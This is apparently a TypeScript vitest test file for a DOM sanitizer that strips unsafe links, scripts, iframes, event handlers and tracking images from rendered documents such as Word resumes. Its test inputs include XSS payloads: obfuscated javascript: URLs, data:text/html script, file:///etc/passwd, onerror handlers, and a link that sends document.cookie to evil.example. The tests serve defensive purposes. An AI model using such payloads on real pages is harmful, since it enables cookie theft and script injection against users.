import { describe, expect, it } from "vitest";
import { neutralizeRenderedDocument, safeDocumentHref, safeDocumentSrc, type MinimalElement, type MinimalRoot } from "./sanitizeDom";

// A tiny element tree with the DOM methods the sanitizer uses.
class El implements MinimalElement {
  attrs = new Map<string, string>();
  removed = false;
  constructor(public tagName: string, attrs: Record<string, string> = {}) {
    for (const [k, v] of Object.entries(attrs)) this.attrs.set(k, v);
  }
  get attributes() {
    return [...this.attrs].map(([name, value]) => ({ name, value }));
  }
  getAttribute(n: string) {
    return this.attrs.get(n) ?? null;
  }
  setAttribute(n: string, v: string) {
    this.attrs.set(n, v);
  }
  removeAttribute(n: string) {
    this.attrs.delete(n);
  }
  remove() {
    this.removed = true;
  }
}
class Root implements MinimalRoot {
  constructor(public els: El[]) {}
  querySelectorAll(sel: string) {
    const live = this.els.filter((e) => !e.removed);
    if (sel === "*") return live;
    const tags = sel.split(",");
    return live.filter((e) => tags.includes(e.tagName.toLowerCase()));
  }
}

describe("safeDocumentHref", () => {
  it.each([
    ["https://www.linkedin.com/in/alex-rivera", true],
    ["http://example.com", true],
    ["mailto:alex@example.com", true],
    ["#_Toc123", true],
    ["javascript:alert(1)", false],
    ["  JavaScript:alert(1)", false],
    ["java\tscript:alert(1)", false],
    ["java\nscript:alert(1)", false],
    ["\u0001javascript:alert(1)", false],
    ["data:text/html,<script>alert(1)</script>", false],
    ["vbscript:msgbox", false],
    ["file:///etc/passwd", false],
    ["relative/path", false],
    ["", false],
  ])("%s -> allowed: %s", (href, ok) => {
    expect(safeDocumentHref(href) !== null).toBe(ok);
  });

  it("allows only blob: and data:image sources", () => {
    expect(safeDocumentSrc("blob:https://app/123")).not.toBeNull();
    expect(safeDocumentSrc("data:image/png;base64,AAAA")).not.toBeNull();
    expect(safeDocumentSrc("data:image/svg+xml;base64,AAAA")).toBeNull();
    expect(safeDocumentSrc("https://tracker.example/pixel.gif")).toBeNull();
  });
});

describe("neutralizeRenderedDocument", () => {
  it("strips a javascript: link from a rendered Word resume but keeps real links", () => {
    const bad = new El("A", { href: "javascript:fetch('//evil.example?'+document.cookie)" });
    const good = new El("A", { href: "https://github.com/alex-rivera" });
    const anchor = new El("A", { href: "#section" });
    const changed = neutralizeRenderedDocument(new Root([bad, good, anchor]));
    expect(changed).toBe(1);
    expect(bad.getAttribute("href")).toBeNull();
    expect(good.getAttribute("href")).toBe("https://github.com/alex-rivera");
    expect(good.getAttribute("rel")).toBe("noopener noreferrer");
    expect(good.getAttribute("target")).toBe("_blank");
    expect(anchor.getAttribute("target")).toBeNull();
  });

  it("removes event handlers, scripts, frames and tracking images", () => {
    const script = new El("SCRIPT");
    const frame = new El("IFRAME", { src: "https://evil.example" });
    const p = new El("P", { onclick: "alert(1)", style: "color:red" });
    const img = new El("IMG", { src: "https://tracker.example/p.gif", onerror: "alert(1)" });
    const own = new El("IMG", { src: "blob:https://app/1" });
    neutralizeRenderedDocument(new Root([script, frame, p, img, own]));
    expect(script.removed && frame.removed).toBe(true);
    expect(p.getAttribute("onclick")).toBeNull();
    expect(p.getAttribute("style")).toBe("color:red");
    expect(img.getAttribute("src")).toBeNull();
    expect(img.getAttribute("onerror")).toBeNull();
    expect(own.getAttribute("src")).toBe("blob:https://app/1");
  });

  it("handles svg xlink:href too", () => {
    const use = new El("use", { "xlink:href": "javascript:alert(1)" });
    neutralizeRenderedDocument(new Root([use]));
    expect(use.getAttribute("xlink:href")).toBeNull();
  });
});
